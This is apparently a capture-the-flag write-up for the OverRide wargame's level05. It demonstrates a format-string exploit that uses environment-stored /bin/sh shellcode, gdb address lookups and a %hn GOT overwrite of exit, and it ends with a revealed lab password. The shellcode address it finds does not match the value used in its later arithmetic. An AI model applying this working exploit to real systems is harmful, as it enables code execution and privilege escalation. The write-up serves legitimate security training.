@@ -1,0 +1,72 @@
+the only vulnerable piece of code that we have is only the printf
+which means that we can only overwrite the exit jmp addr in the got
+and the only other place that have a safe access is the env beacuse of
+the for loop in the code so we load the shellcode:
+
+export SHELLCODE=$(python -c "print('\x90'*4 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x83\xe4\xf0\xcd\x80')")
+
+now we must get the code address:
+
+> gdb level5
+(gdb) start
+Temporary breakpoint 1 at 0x8048449
+Starting program: /home/users/level05/level05
+
+Temporary breakpoint 1, 0x08048449 in main ()
+(gdb) x /x getenv("SHELLCODE")
+0xffffdf9d:     0x90909090
+
+now that we have the address we need to find the address of exit
+
+(gdb) i fun exit
+All functions matching regular expression "exit":
+
+Non-debugging symbols:
+0x08048370  exit
+0x08048370  exit@plt
+0xf7e5eb70  exit
+0xf7e5eba0  on_exit
+0xf7e5edb0  __cxa_atexit
+0xf7e5ef50  quick_exit
+0xf7e5ef80  __cxa_at_quick_exit
+0xf7ee45c4  _exit
+0xf7f27ec0  pthread_exit
+0xf7f2d4f0  __cyg_profile_func_exit
+0xf7f4bc30  svc_exit
+0xf7f55d80  atexit
+(gdb) x /4i 0x08048370
+   0x8048370 <exit@plt>:        jmp    *0x80497e0
+   0x8048376 <exit@plt+6>:      push   $0x18
+   0x804837b <exit@plt+11>:     jmp    0x8048330
+   0x8048380 <__libc_start_main@plt>:   jmp    *0x80497e4
+
+
+
+level05@OverRide:~$ ./level05
+%1$lx__%2$lx__%3$lx__%4$lx__%5$lx__%6$lx__%7$lx__%8$lx__%9$lx__
+64__f7fcfac0__f7ec3af9__ffffd6bf__ffffd6be__0__ffffffff__ffffd744__f7fdb000__
+level05@OverRide:~$ ./level05
+%10$lx__%11$lx__%12$lx__%13$lx__%14$lx__%15$lx__%16$lx__%17$lx__%18$lx__%19$lx__
+24303125__5f5f786c__24313125__5f5f786c__24323125__5f5f786c__24333125__5f5f786c__24343125__5f5f786c__
+
+
+now we also know where the offset of the input which is 10 and 11 because we need
+to split the address to not write like 4294959005 that would take an eternity
+
+0x80497e0 -> "\xe0\x97\x04\x08" and "\xe2\x97\x04\x08" for the second piece
+
+0xffffdf9d -> 0xdf9d, 0xffff -> 0xdf9d - 8, 0xffff - 0xdf9d (8 are the two addresses)
+
+0xd8ce - 8 = 55494
+0xffff - 0xd8ce = 10033
+
+so:
+
+'\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55494c%10$hn' + '%10033c%11$hn'
+> python -c "print('\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55494c%10$hn' + '%10033c%11$hn')" > /tmp/exploit
+
+> cat /tmp/exploit - | ./level05
+
+cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+
